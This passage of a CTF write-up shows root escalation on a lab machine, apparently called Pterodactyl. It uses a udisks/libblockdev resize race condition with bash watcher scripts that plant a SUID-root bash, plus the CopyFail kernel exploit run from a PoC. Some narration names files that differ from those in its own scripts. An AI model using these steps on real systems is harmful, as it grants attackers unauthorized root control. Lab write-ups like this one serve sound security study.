![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FgJZfuRcLdjaupWMdBbzz%252FScreenshot%2520%282486%29.png%3Falt%3Dmedia%26token%3D18647ee2-804f-488f-a226-b761006cf483&width=768&dpr=3&quality=100&sign=ff0864e2&sv=2)

Without **CVE-2025-6018**, the command would be blocked because it requires `allow_active` privileges, which normal SSH users don't have:>

Next, I'll mount the created device.

`udisksctl mount -b /dev/loop0`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FlBQ783p1KuXvTxELQnp5%252FScreenshot%2520%282487%29.png%3Falt%3Dmedia%26token%3D3340cfe4-9af1-4463-808b-ab2d9ff77fa3&width=768&dpr=3&quality=100&sign=22b39ce&sv=2)

The device was successfully mounted, but it is mounted with the `nosuid` option, which prevents SUID binaries from working. I’ll unmount it.

`udisksctl unmount -b /dev/loop0`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fh8fouOiKspImsAlUVDSk%252FScreenshot%2520%282488%29.png%3Falt%3Dmedia%26token%3D55aae94e-87d0-4715-8d23-e1848a0a5d6b&width=768&dpr=3&quality=100&sign=87d007f4&sv=2)

We exploit this flaw by first creating an XFS filesystem image that contains a SUID binary set to root (like a copy of `/bin/bash`). The normal user-facing mount function in `udisks` is secure because it adds the `nosuid` flag, which blocks this kind of attack. So, instead, we trigger the vulnerable `resize` function on our image. This causes the `libblockdev` library to internally mount our filesystem at a temporary location like `/tmp/blockdev.XXXXXX` in order to perform the resize operation. Critically, this internal mount does not include the `nosuid` security flag. This gives us a brief window where our malicious filesystem is live and active with full root privileges. We then race to execute our SUID-root binary from this temporary mount point before the resize operation completes and the system unmounts the filesystem, which grants us a full root shell.

Now let's make a watcher using `bash`

```bash
#!/bin/bash

while true; do
  find /tmp /run /var/tmp -maxdepth 3 -type d \
    \( -name '*resize*' -o -name '*blockdev*' -o -name 'temp-*' -o -name '.*-XXX*' \) \
    2>/dev/null
done | awk '!seen[$0]++'
```

Now I will trigger the resize operation from a separate session.

`gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop0 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FwYm12uzFEjCt16kndYSh%252FScreenshot%2520%282489%29.png%3Falt%3Dmedia%26token%3D148f84cb-f69a-4219-b15e-bb97fa44206e&width=768&dpr=3&quality=100&sign=ea042867&sv=2)

The resize and watcher interaction revealed both the format and location of the temporary mount. With that information, I can now set up a new watcher designed to exploit the same behavior during the next resize operation.

```bash
#!/bin/bash

declare -A processed

while true; do
  find /tmp /run /var/tmp -maxdepth 3 -type d \
    \( -name '*resize*' -o -name '*blockdev*' -o -name 'temp-*' -o -name '.*-XXX*' \) \
    2>/dev/null | 
  while IFS= read -r d; do
    if [[ -n "${processed[$d]}" ]]; then
      continue
    fi

    if [ -x "$d/rooters" ]; then
      processed["$d"]=1

      "$d/rooters" -p -c '
        cp /bin/bash /tmp/kur0_unf0rgiven
        chown root:root /tmp/kur0_unf0rgiven
        chmod 4755 /tmp/kur0_unf0rgiven
        echo DONE BRUH
      ' 2>/dev/null
      
      if [ -u /tmp/kur0_unf0rgiven ]; then
        exit 0
      fi
    fi
  done
done
```

On the next resize, the loop is triggered at just the right moment. The `rootbash` binary becomes temporarily executable with root privileges inside `/tmp/blockdev.XXXXXX`, and the loop leverages this to copy `/bin/bash` to `/tmp/0xdf`, then sets the SUID bit so the new copy also runs as root.

From a separate session, I run the same `gdbus` resize command again, and this time the watcher successfully detects the condition.

**It’s important to note that this approach is based on a race condition, so it may not succeed on the first attempt. In practice, it often requires repeating the resize operation multiple times until the timing aligns correctly and the payload executes within the short-lived window where the temporary mount is accessible.**

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FeMUtQeFm3CcfRKqxxehS%252FScreenshot%2520%282503%29.png%3Falt%3Dmedia%26token%3D057f10d5-baea-4f03-9b45-5124b01624d2&width=768&dpr=3&quality=100&sign=60ac1794&sv=2)

After several attempts, I finally won the race condition and obtained a root shell!

### Alternate Route: CopyFail (CVE-2026-31431) — Unintended Way

Reviewing `/etc/os-release` shows that the machine is running **openSUSE Leap 15.6**.

This clarifies why the OS detection from the earlier Nmap scan didn’t match any familiar or consistent profile. In openSUSE, service versions don’t always map cleanly to a specific distribution release, which can make remote fingerprinting misleading or inconclusive.

Given this version, the system may be susceptible to newer local privilege escalation exploits in Linux, such as **CopyFail** and **DirtyFrag**.

Previously, the service banners gave conflicting hints about the underlying OS. The OpenSSH version initially suggested something like Ubuntu 24.04 (noble), although that would typically be explicitly reflected in the version string. At the same time, the Nginx version pointed more toward an older Ubuntu release, possibly 22.04 (jammy), though Nginx is generally not reliable for precise OS identification.

Because of these mixed indicators, several explanations are possible: the system might be running Ubuntu 24.04 with older packaged components, Nginx could be operating inside a container based on a different OS, or the host may simply be using a different Linux distribution entirely.

For this part, I’ll be using the CopyFail exploit. I’ll rely on a PoC provided by a friend, with credit to Nullbytez’s Captain Zor0ark for developing the PoC for this vulnerability. The PoC is available in his [GitHub](https://github.com/Sl4cK0TH/CVE-2026-31431-PoC) repository.

What is **CopyFail** and how does it work? Let me explain quickly, **CopyFail (CVE-2026-31431)** is a critical Linux kernel flaw that lets us, as unprivileged users, gain full root access in seconds. We exploit it by tricking a specific crypto feature (AF\_ALG) into making a tiny, controlled 4-byte change to the in-memory copy of any file we can read.

Here's how we do it: We use the `splice()` system call to feed the kernel a file (like `/usr/bin/su`) into a crypto operation. Due to a bug in the `authencesn` algorithm, it uses part of the file's own memory as temporary scratch space, overwriting 4 bytes with data we control. Even though the crypto operation fails, our 4-byte write sticks in the system's memory cache (page cache).

Since the kernel uses this cached version when running programs, we can use this primitive to surgically patch a few bytes in a setuid binary (like `su`). We repeat the process to write a small piece of shellcode that spawns a root shell. When we run the patched binary, the kernel sees it as a legitimate, unmodified setuid program and hands us a root shell. The original file on disk stays unchanged, making it stealthy.

Returning to the PoC, the exploit is written in Python. However, since Python is not installed on the target system, I will compile the script into a standalone binary using `PyInstaller`.

`pyinstaller --onefile exploit.py`

Next, we simply transfer the compiled binary to the target again using `scp`, just like before.

Once the transfer is complete, we update its permissions to make it executable.

`chmod +x exploit`

and then run it directly

`./exploit`

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FWPIjbkUmHJPg1lyL5QVw%252FScreenshot%2520%282510%29.png%3Falt%3Dmedia%26token%3D3b17c34f-fd78-4f23-b3af-d75ef0205d5f&width=768&dpr=3&quality=100&sign=faf8e831&sv=2)

And just like that, we obtained a root shell. Fast right?:>

At this point, we've successfully pwned **Pterodactyl**!!
